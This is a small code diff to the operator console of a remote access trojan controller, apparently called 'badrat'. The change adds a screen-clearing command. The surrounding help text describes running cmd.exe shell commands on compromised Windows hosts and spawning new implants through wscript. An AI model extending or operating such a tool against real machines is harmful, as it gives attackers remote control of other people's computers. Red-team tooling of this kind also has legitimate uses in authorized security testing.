@@ -6,6 +6,7 @@ import base64
 import threading
 import sys
 import logging
+import os
 
 # CSCI 201 teacher: Noooo you can't just use global variables to make things easier
 # haha, global variables go brrr
@@ -98,6 +99,7 @@ def get_help():
     print("kill -- when interacting with a rat, type kill to task the rat to shut down")
     print("spawn -- used to spawn a new rat in a new wscript process.")
     print("<command> -- enter shell commands to run on the rat. Uses cmd.exe")
+    print("clear -- clear the screen. ")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
@@ -141,6 +143,10 @@ while True:
             remove_rat("all")
         else:
             remove_rat(inp.split(" ")[1])
+    
+    # Clear the screen
+    elif(inp == "clear"):
+        os.system("clear")
 
     # Enter rat specific command prompt
     elif(inp in rats.keys()):
@@ -151,7 +157,9 @@ while True:
                 break
             elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
                 get_rats()
-            if(inp.startswith("cd ")):
+            elif(inp == "clear"):
+                os.system("clear")
+            elif(inp.startswith("cd ")):
               print("[!] Full paths only! No cd in badrat")
             elif(inp):
                 if(inp == "kill"):
